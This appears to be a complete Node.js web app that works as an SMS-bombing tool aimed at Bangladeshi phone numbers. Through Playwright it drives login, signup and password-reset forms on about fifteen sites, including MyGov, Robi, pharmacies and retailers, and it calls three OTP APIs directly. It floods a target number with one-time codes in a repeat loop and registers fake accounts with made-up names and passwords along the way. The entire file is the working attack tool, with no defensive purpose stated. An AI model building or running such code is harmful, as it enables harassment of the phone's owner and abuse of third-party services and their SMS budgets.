const { chromium } = require("playwright");
const express = require("express");
const app = express();
const PORT = process.env.PORT || 7860;

app.use(express.urlencoded({ extended: true }));

const { exec } = require("child_process");

const http = require("http");
const https = require("https");

function sendMedEasy(phone) {
  const formatted = `+880${phone.slice(-10)}`;
  return new Promise((resolve) => {
    https.get(`https://api.medeasy.health/api/send-otp/${formatted}/`, { headers: { Accept: "application/json" } }, (res) => {
      let d = "";
      res.on("data", (c) => (d += c));
      res.on("end", () => resolve(res.statusCode >= 200 && res.statusCode < 300 ? "DONE" : `HTTP ${res.statusCode}`));
    }).on("error", (e) => resolve(e.message.split("\n")[0]));
  });
}

function sendRedX(phone) {
  return new Promise((resolve) => {
    const data = JSON.stringify({ phoneNumber: phone });
    const req = https.request("https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp", {
      method: "POST",
      headers: { "Content-Type": "application/json", "Content-Length": data.length },
    }, (res) => {
      let d = "";
      res.on("data", (c) => (d += c));
      res.on("end", () => resolve(res.statusCode >= 200 && res.statusCode < 300 ? "DONE" : `HTTP ${res.statusCode}`));
    });
    req.on("error", (e) => resolve(e.message.split("\n")[0]));
    req.write(data);
    req.end();
  });
}

function sendBDTickets(phone) {
  return (async () => {
    try {
      const deviceId = `${Date.now()}-${Math.random().toString(36).slice(2)}`;
      const body = JSON.stringify({ device_id: deviceId, device_type: "desktop" });
      const tokenRes = await fetch("https://apiv1.bdtickets.com/api/v1/auth/anonymous", { method: "POST", body, headers: { "Content-Type": "application/json" } });
      const token = (await tokenRes.json()).access_token || "";
      if (!token) return "no token";
      const otpRes = await fetch("https://apiv1.bdtickets.com/api/v1/auth/otp/send", { method: "POST", body: JSON.stringify({ phone: `+880${phone.slice(-10)}` }), headers: { Authorization: `Bearer ${token}`, "Content-Type": "application/json", "x-platform": "web", "x-channel": "direct" } });
      return otpRes.ok ? "DONE" : `HTTP ${otpRes.status}`;
    } catch (e) {
      return e.message.split("\n")[0];
    }
  })();
}

const sites = [
  {
    name: "Arogga", url: "https://www.arogga.com/account",
    steps: [
      { action: "wait", ms: 2000 },
      { action: "click", selector: 'button:has-text("Login")' },
      { action: "wait", ms: 2000 },
      { action: "fill", selector: 'input[placeholder="Enter phone number"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Send")' },
      { action: "wait", ms: 2000 },
    ],
  },
  {
    name: "IqraLive", url: "https://iqra-live.com/",
    steps: [
      { action: "fill", selector: "#mobile" },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Sign In")' },
      { action: "wait", ms: 2000 },
    ],
  },
  {
    name: "Apex4u", url: "https://apex4u.com/sign-in",
    steps: [
      { action: "wait", ms: 5000 },
      { action: "fill", selector: 'input.form-field' },
      { action: "wait", ms: 500 },
      { action: "click", selector: '[data-testid="proceed-button"]' },
      { action: "wait", ms: 2000 },
    ],
  },
  {
    name: "MedEasy", url: "https://medeasy.health/",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "click", selector: 'text=Sign In' },
      { action: "wait", ms: 3000 },
      { action: "fill", selector: 'input[name="phone"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Send OTP")' },
      { action: "wait", ms: 2000 },
    ],
  },
  {
    name: "Chorki", url: "https://www.chorki.com/login",
    steps: [
      { action: "wait", ms: 5000 },
      { action: "wait_turnstile" },
      { action: "fill_phone", selector: 'input.react-international-phone-input' },
      { action: "check", selector: 'input[name="userConsent"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button[type="submit"]' },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Robi", url: "https://www.robi.com.bd/en/auth/login",
    steps: [
      { action: "wait", ms: 5000 },
      { action: "robi" },
      { action: "wait", ms: 4000 },
    ],
  },
  {
    name: "MyGov", url: "https://idp-v2.live.mygov.bd/registration", waitUntil: "domcontentloaded",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "fill", selector: 'input[name="citizen_name"]', value: "Test User" },
      { action: "wait", ms: 500 },
      { action: "fill", selector: 'input#mobile' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button[type="submit"]' },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Sailor", url: "https://sailor.clothing/login",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "click", selector: 'button:has-text("registration")' },
      { action: "wait", ms: 1000 },
      { action: "fill", selector: 'input[placeholder="01XXXXXXXXX"]' },
      { action: "wait", ms: 300 },
      { action: "fill_rnd", selector: 'input[placeholder="Enter email address (example@example.com)"]', prefix: "sailor_", suffix: "@mail.com" },
      { action: "wait", ms: 300 },
      { action: "fill", selector: 'input[placeholder="Enter Password"]', value: "Test1234" },
      { action: "wait", ms: 300 },
      { action: "fill", selector: 'input[placeholder="Enter confirm-password"]', value: "Test1234" },
      { action: "wait", ms: 300 },
      { action: "click", selector: 'button:has-text("create account")' },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "LeraveCraze", url: "https://www.lerevecraze.com/login/",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "fill", selector: "input#account_display_name" },
      { action: "wait", ms: 500 },
      { action: "click", selector: "input#lrv-login-btn" },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Othoba", url: "https://othoba.com/register?returnUrl=%2F", waitUntil: "domcontentloaded",
    steps: [
      { action: "wait", ms: 4000 },
      { action: "fill", selector: "input#Phone" },
      { action: "wait", ms: 300 },
      { action: "fill_rnd", selector: "input#Email", prefix: "oth_", suffix: "@mail.com" },
      { action: "wait", ms: 300 },
      { action: "fill", selector: "input#FirstName", value: "Test" },
      { action: "wait", ms: 300 },
      { action: "fill", selector: "input#LastName", value: "User" },
      { action: "wait", ms: 300 },
      { action: "click", selector: 'label:has-text("Male")' },
      { action: "wait", ms: 300 },
      { action: "select", selector: 'select[name="DateOfBirthDay"]', value: "15" },
      { action: "wait", ms: 200 },
      { action: "select", selector: 'select[name="DateOfBirthMonth"]', value: "6" },
      { action: "wait", ms: 200 },
      { action: "select", selector: 'select[name="DateOfBirthYear"]', value: "1995" },
      { action: "wait", ms: 300 },
      { action: "fill", selector: "input#Password", value: "Test1234" },
      { action: "wait", ms: 300 },
      { action: "fill", selector: "input#ConfirmPassword", value: "Test1234" },
      { action: "wait", ms: 300 },
      { action: "click", selector: "button#register-button" },
      { action: "wait", ms: 5000 },
    ],
  },
  {
    name: "PizzaHutBD", url: "https://www.pizzahutbd.com/customer/login",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "fill", selector: "input#locationInput", value: "Gulshan 1" },
      { action: "wait", ms: 1500 },
      { action: "click", selector: ".pac-item" },
      { action: "wait", ms: 1000 },
      { action: "click", selector: "button.confirm-btn" },
      { action: "wait", ms: 4000 },
      { action: "goto", url: "https://www.pizzahutbd.com/customer/login" },
      { action: "wait", ms: 3000 },
      { action: "fill", selector: "input#full_name", value: "User" },
      { action: "fill", selector: "input#phone" },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Sign In")' },
      { action: "wait", ms: 5000 },
    ],
  },
  {
    name: "Kimi", url: "https://www.kimi.com/login", waitUntil: "domcontentloaded",
    steps: [
      { action: "wait", ms: 8000 },
      { action: "click", selector: 'input[placeholder="+86"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'span:has-text("+880")' },
      { action: "wait", ms: 500 },
      { action: "fill", selector: 'input[placeholder="Phone number"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button:has-text("Send Code")' },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Ostad", url: "https://ostad.app/login",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "click", selector: '.cursor-pointer.py-2.px-3:nth-of-type(2)' },
      { action: "wait", ms: 1000 },
      { action: "fill", selector: 'input[type="number"]' },
      { action: "wait", ms: 500 },
      { action: "click", selector: 'button[type="submit"]' },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Bishworang", url: "https://www.bishworang.com.bd/login",
    steps: [
      { action: "wait", ms: 3000 },
      { action: "bishworang_forgot" },
      { action: "wait", ms: 3000 },
    ],
  },
  {
    name: "Ilyn", url: "https://ilyn.global/bd/en/auth/forgot-password", waitUntil: "domcontentloaded",
    steps: [
      { action: "wait", ms: 6000 },
      { action: "ilyn_forgot" },
      { action: "wait", ms: 5000 },
    ],
  },
];

async function runSite(browser, site, phone) {
  const ctx = await browser.newContext();
  const page = await ctx.newPage();
  try {
    await page.goto(site.url, { waitUntil: site.waitUntil || "networkidle", timeout: 30000 });
    for (const step of site.steps) {
      if (step.action === "fill") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        const val = step.value || phone;
        await page.fill(step.selector, val);
      } else if (step.action === "click") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        await page.click(step.selector);
      } else if (step.action === "wait") {
        await page.waitForTimeout(step.ms);
      } else if (step.action === "check") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        await page.check(step.selector);
      } else if (step.action === "fill_phone") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        await page.fill(step.selector, `+880${phone.slice(-10)}`);
      } else if (step.action === "wait_turnstile") {
        await page.waitForTimeout(5000);
        try { await page.waitForFunction(() => { const el = document.querySelector('input[name="cf-turnstile-response"]'); return el && el.value && el.value.length > 0; }, { timeout: 20000 }); } catch {}
      } else if (step.action === "goto") {
        await page.goto(step.url, { waitUntil: "networkidle", timeout: 30000 });
      } else if (step.action === "fill_rnd") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        const val = `${step.prefix || ""}${Date.now()}${step.suffix || ""}`;
        await page.fill(step.selector, val);
      } else if (step.action === "select") {
        await page.waitForSelector(step.selector, { timeout: 15000 });
        await page.selectOption(step.selector, step.value);
      } else if (step.action === "bishworang_forgot") {
        await page.evaluate((phone) => {
          const a = document.querySelector("a.forget-pass");
          if (a) a.click();
          setTimeout(() => {
            const inp = document.querySelector(".forgot-pass-modal input");
            if (inp) { inp.value = phone; inp.dispatchEvent(new Event("input", { bubbles: true })); }
            setTimeout(() => {
              const btn = document.querySelector(".forgot-pass-modal .send-btn");
              if (btn) btn.click();
            }, 500);
          }, 1000);
        }, phone);
      } else if (step.action === "ilyn_forgot") {
        await page.evaluate((phone) => {
          const inp = document.querySelector('input[type="text"]');
          if (!inp) return;
          const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
          nativeSetter.call(inp, phone);
          inp.dispatchEvent(new Event("input", { bubbles: true }));
          inp.dispatchEvent(new Event("change", { bubbles: true }));
          setTimeout(() => {
            const btn = document.querySelector('button[type="submit"]');
            if (btn && !btn.disabled) btn.click();
          }, 500);
        }, phone);
      } else if (step.action === "robi") {
        await page.evaluate((phone) => {
          const accept = Array.from(document.querySelectorAll("button")).find(b => b.textContent.includes("Accept Cookies"));
          if (accept) accept.click();
          setTimeout(() => { const bd = document.querySelector(".MuiBackdrop-root"); if (bd) bd.click(); }, 500);
          setTimeout(() => { const btn = Array.from(document.querySelectorAll("button")).find(b => b.textContent.includes("Log In")); if (btn) btn.click(); }, 1500);
          setTimeout(() => {
            const input = document.querySelector('input[aria-label="mobile-number"]');
            if (!input) return;
            const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLInputElement.prototype, "value").set;
            nativeSetter.call(input, phone);
            input.dispatchEvent(new Event("input", { bubbles: true }));
            const sendBtn = Array.from(document.querySelectorAll("button")).find(b => b.textContent.includes("Send OTP"));
            if (sendBtn && !sendBtn.disabled) sendBtn.click();
          }, 3500);
        }, phone);
      }
    }
    return { name: site.name, status: "DONE" };
  } catch (err) {
    return { name: site.name, status: "FAILED", error: err.message.split("\n")[0] };
  } finally {
    await ctx.close();
  }
}

async function run(phone, count, delay) {
  const browser = await chromium.launch({ headless: true });
  for (let i = 0; i < count; i++) {
    const results = await Promise.allSettled([
      ...sites.map((site) => runSite(browser, site, phone)),
      sendBDTickets(phone),
      sendMedEasy(phone),
      sendRedX(phone),
    ]);
    console.log(`[${i + 1}/${count}]`);
    for (const r of results) {
      const v = r.value || {};
      console.log(`  [${v.name}] ${v.status}${v.error ? " - " + v.error : ""}`);
    }
    if (i < count - 1 && delay > 0) {
      console.log(`  Waiting ${delay}s ...`);
      await new Promise((r) => setTimeout(r, delay * 1000));
    }
  }
  await browser.close();
}

app.get("/", (req, res) => {
  res.send(`
    <html><body style="font-family:sans-serif;max-width:600px;margin:40px auto;text-align:center">
    <h1>SMS-Web OTP Sender</h1>
    <form method="POST">
      <label>Phone:</label><br>
      <input name="phone" placeholder="017XXXXXXXX" style="width:250px;padding:8px"><br><br>
      <label>Count:</label><br>
      <input name="count" value="1" style="width:60px;padding:8px"><br><br>
      <label>Delay (s):</label><br>
      <input name="delay" value="3" style="width:60px;padding:8px"><br><br>
      <button type="submit" style="padding:10px 30px;background:black;color:white;border:none;border-radius:6px;cursor:pointer">Run</button>
    </form>
    </body></html>
  `);
});

app.post("/", async (req, res) => {
  const phone = req.body.phone;
  const count = parseInt(req.body.count) || 1;
  const delay = parseInt(req.body.delay) || 3;
  if (!phone) return res.status(400).send("Phone required");

  const chunks = [];
  const origLog = console.log;
  console.log = (...args) => {
    chunks.push(args.join(" "));
    origLog.apply(console, args);
  };

  try {
    await run(phone, count, delay);
  } catch (e) {
    chunks.push("ERROR: " + e.message.split("\n")[0]);
  }

  console.log = origLog;
  res.send(`<pre style="font-family:monospace;background:#f5f5f5;padding:20px;border-radius:8px">${chunks.join("\n")}</pre><br><a href="/">Back</a>`);
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
